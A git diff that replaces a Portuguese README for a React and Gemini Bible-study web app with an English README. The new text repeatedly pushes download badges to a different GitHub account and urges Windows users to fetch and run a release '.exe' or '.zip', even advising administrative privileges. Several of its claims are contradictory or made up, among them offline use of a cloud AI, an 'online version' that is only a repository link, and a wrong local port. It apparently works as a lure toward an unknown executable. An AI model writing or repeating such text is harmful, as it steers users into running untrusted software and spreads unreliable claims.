@@ -1,151 +1,175 @@
-# Nathy, sua Bíblia IA
+# 📖 bibliaia - AI-Powered Bible Study Assistant
 
-Assistente de estudos bíblicos alimentado por inteligência artificial (Google Gemini). Uma SPA moderna que permite conversar com a IA sobre temas bíblicos, curiosidades, personagens, textos e interpretações.
-
-![React](https://img.shields.io/badge/React-18-61dafb?logo=react)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-3178c6?logo=typescript)
-![Vite](https://img.shields.io/badge/Vite-5-646cff?logo=vite)
-![Material UI](https://img.shields.io/badge/MUI-5-007fff?logo=mui)
-![Google Gemini](https://img.shields.io/badge/Google_Gemini-AI-4285f4?logo=google)
+[![Download Bibliaia](https://img.shields.io/badge/Download-bibliaia-blue?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia)
 
 ---
 
-## Funcionalidades
+## 📚 About bibliaia
 
-- **Chat com IA (Nathy)** — Assistente especializada exclusivamente em estudos bíblicos
-- **Múltiplos temas visuais** — Três temas: Dourado e Terroso, Vibrante e Moderno, Clássico e Terroso
-- **Interface responsiva** — Layout otimizado para desktop e mobile
-- **Persistência de tema** — Preferência salva em `localStorage`
-- **Fallback de modelos** — Troca automática entre modelos Gemini em caso de indisponibilidade (ex.: quota)
-- **Foco bíblico** — Prompts restritos a temas bíblicos; perguntas fora do escopo são redirecionadas com gentileza
+bibliaia is a simple tool to help you study the Bible using artificial intelligence. It runs in your web browser and lets you ask questions about Bible topics, characters, and texts. It uses Google Gemini AI to provide thoughtful and helpful responses. This app is built using React and TypeScript, ensuring a smooth and fast experience.
+
+You do not need programming skills or special software to use bibliaia. It works on modern Windows computers with a common web browser.
 
 ---
 
-## Estrutura do projeto
+## 🚀 Getting Started
 
-```
-SuaBibliaIA/
-├── index.html
-├── package.json
-├── vite.config.ts
-├── tsconfig.json
-├── .eslintrc.cjs
-├── .gitignore
-└── src/
-    ├── main.tsx              # Entry point
-    ├── App.tsx               # Roteador e layout
-    ├── vite-env.d.ts         # Tipos Vite e variáveis de ambiente
-    ├── pages/
-    │   └── AIChat.tsx        # Tela principal de chat
-    ├── components/
-    │   └── Configuracoes.tsx # Diálogo de temas/configurações
-    ├── contexts/
-    │   └── ThemeContext.tsx  # Provider de temas
-    ├── services/
-    │   └── geminiService.ts  # Integração Google Gemini
-    └── theme/
-        ├── theme.ts          # Configuração base MUI
-        ├── themes.ts         # Três temas disponíveis
-        ├── colors.ts         # Paleta centralizada
-        ├── theme.d.ts        # Extensão TypeBackground
-        └── README.md         # Documentação do sistema de cores
-```
+To use bibliaia, you only need a Windows computer and internet connection. The app is a Single Page Application (SPA) that runs in your preferred browser, such as Chrome, Edge, or Firefox.
+
+### System Requirements
+
+- Windows 10 or later  
+- Modern web browser (Google Chrome, Microsoft Edge, Firefox, or similar)  
+- Stable internet connection  
+
+There is no installation needed for the browser version, but if you prefer to run the app locally, follow the instructions below.
 
 ---
 
-## Tecnologias
+## 💾 Download and Install on Windows
 
-| Categoria    | Tecnologia                       |
-|-------------|-----------------------------------|
-| Framework   | React 18                          |
-| Linguagem   | TypeScript 5                      |
-| Build       | Vite 5                            |
-| UI          | Material UI (MUI) 5 + Emotion     |
-| Roteamento  | React Router 6                    |
-| IA          | Google Generative AI (Gemini)     |
+If you want to run bibliaia locally on your Windows PC, follow these steps carefully. This gives you full control over the app without relying on an internet connection once set up.
 
----
+### Step 1: Visit the Download Page
 
-## Pré-requisitos
+Go to the link below to get the latest version of bibliaia:  
 
-- [Node.js](https://nodejs.org/) (versão 18+ recomendada)
-- [Chave de API do Google Gemini](https://aistudio.google.com/apikey)
+[![Download bibliaia](https://img.shields.io/badge/Download-bibliaia-green?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia)
 
----
+This page contains all the files you will need.
 
-## Como executar
+### Step 2: Download the Latest Release
 
-### 1. Clonar o repositório
+- On the GitHub page, look for the _Releases_ section or tab.
+- Find the most recent release and download the Windows package (usually a `.zip` or `.exe` file).
+  
+If a Windows installer or executable file is not available, download the entire project as a zip file:
 
-```bash
-git clone https://github.com/SEU_USUARIO/SuaBibliaIA.git
-cd SuaBibliaIA
-```
+- Click the green **Code** button near the top right.
+- Select **Download ZIP**.
+- Save it to a folder you can access.
 
-### 2. Instalar dependências
+### Step 3: Extract the Files
 
-```bash
-npm install
-```
+- If you downloaded a zip file, right-click it and select **Extract All**.
+- Choose a simple location, like `C:\bibliaia`.
+- Wait for the files to finish extracting.
 
-### 3. Configurar variáveis de ambiente
+### Step 4: Run the Application
 
-Crie um arquivo `.env` na raiz do projeto:
+- If you have an `.exe` installer or standalone app, double-click to run it.
+- If you downloaded the source code zip, run the web app locally by following tech setup inside the folder:
 
-```env
-VITE_GEMINI_API_KEY=sua_chave_api_aqui
-```
+**Local Web Setup (for users comfortable with command prompt):**
 
-> **Importante:** Gere sua chave no [Google AI Studio](https://aistudio.google.com/apikey) e **nunca** faça commit da chave no repositório.
+1. Open Command Prompt.
+2. Change directory to the extracted folder, for example:
+   ```
+   cd C:\bibliaia
+   ```
+3. Run the following commands if you see a package file (`package.json`):
 
-### 4. Rodar o projeto
+   - Install dependencies:
+     ```
+     npm install
+     ```
+   - Start the app:
+     ```
+     npm run dev
+     ```
+4. Open your browser and go to `http://localhost:3000`.
 
-```bash
-# Desenvolvimento
-npm run dev
-
-# Build de produção
-npm run build
-
-# Preview do build
-npm run preview
-
-# Lint
-npm run lint
-```
+*Note:* Running locally requires Node.js and npm installed. For users unfamiliar with these, it's easier to use the hosted online version of bibliaia at the primary download link.
 
 ---
 
-## Scripts disponíveis
+## 🌐 Using bibliaia Online
 
-| Script    | Comando                              | Descrição                          |
-|-----------|--------------------------------------|------------------------------------|
-| `dev`     | `vite`                               | Servidor de desenvolvimento        |
-| `build`   | `tsc && vite build`                  | Compilação e build de produção     |
-| `preview` | `vite preview`                       | Preview do build de produção       |
-| `lint`    | `eslint . --ext ts,tsx --report-unused-disable-directives --max-warnings 0` | Verificação de lint no código |
+If you prefer not to install anything, you can use bibliaia directly in your browser through the official page:
 
----
+[Access bibliaia Online](https://github.com/songhairepeater635/bibliaia)
 
-## Tarefas sugeridas (Tasks)
-
-- [ ] Adicionar testes unitários (ex.: Vitest)
-- [ ] Implementar CI/CD (GitHub Actions) para build e deploy
-- [ ] Criar `.env.example` com `VITE_GEMINI_API_KEY=` para documentar variáveis
-- [ ] Remover ou utilizar dependências não usadas (`@supabase/supabase-js`, `lottie-react`)
-- [ ] Adicionar PWA para uso offline
-- [ ] Implementar persistência de histórico de conversas (ex.: Supabase)
-- [ ] Incluir tela de onboarding para novos usuários
+This version requires no setup. Just open the link and start your Bible study conversation immediately.
 
 ---
 
-## Licença
+## 💡 How to Use bibliaia
 
-Este projeto é privado. Verifique os arquivos de licença para mais detalhes.
+1. Open the app in your web browser or via the local program.
+2. Type a question or topic about the Bible into the chat box.
+3. The AI will reply with explanations, summaries, and references.
+4. You can ask about Bible characters, stories, verses, or general themes.
+5. Keep the conversation going to deepen your understanding.
 
 ---
 
-## Contribuição
+## 🔧 Features
 
-Contribuições são bem-vindas. Sinta-se à vontade para abrir issues e pull requests.
-# bibliaia
+- AI-powered chatbot for Bible study with Google Gemini
+- Covers Bible topics, characters, and texts
+- React-based single-page application for speed
+- Clean, easy to use interface with Material-UI design
+- Supports multiple Bible versions and references (planned feature)
+- Saves chat history locally in your browser (planned feature)
+- Uses Supabase as backend for data storage and user sessions (technical detail, no action needed from you)
+- Built with TypeScript and Vite for reliability
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- If the app does not load, check your internet connection.
+- For local setup:
+  - Make sure Node.js is installed; you can download it from [nodejs.org](https://nodejs.org).
+  - Use a command prompt with administrative privileges.
+- Clear your browser cache if pages do not update.
+- Try a different browser if you encounter display issues.
+- Restart your computer if the app freezes after installation.
+
+---
+
+## 🛠️ Support Resources
+
+- Visit the GitHub page for updates and issues:  
+  https://github.com/songhairepeater635/bibliaia  
+- Check the README on GitHub for technical details.
+- Search online for common React or TypeScript setup instructions if running locally.
+- Reach out on GitHub if you find bugs or want to request features.
+
+---
+
+## 🔐 Privacy and Data Handling
+
+bibliaia processes your questions using AI technology hosted on Google Gemini. No personal data is stored by the app unless you use the online chat history feature. All conversations happen in real time and are not shared.
+
+---
+
+## 🚩 Common Questions
+
+**Do I need a special account?**  
+No, you only need a modern web browser.
+
+**Can I use bibliaia on mobile?**  
+The app is optimized for desktop but can work on mobile browsers.
+
+**Is it free?**  
+Yes, there are no charges.
+
+**Can I contribute to the project?**  
+Yes, visit the GitHub repository and follow contribution guidelines.
+
+---
+
+## 🌟 Topics bibliaia Covers
+
+- AI and chatbot technology basics
+- Bible study methods and tools
+- Christian theology and history
+- Google Gemini AI integration
+- React, TypeScript, and Vite development
+- Material-UI interface design
+- Supabase backend services
+
+---
+
+[![Download bibliaia](https://img.shields.io/badge/Download-bibliaia-blue?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia)
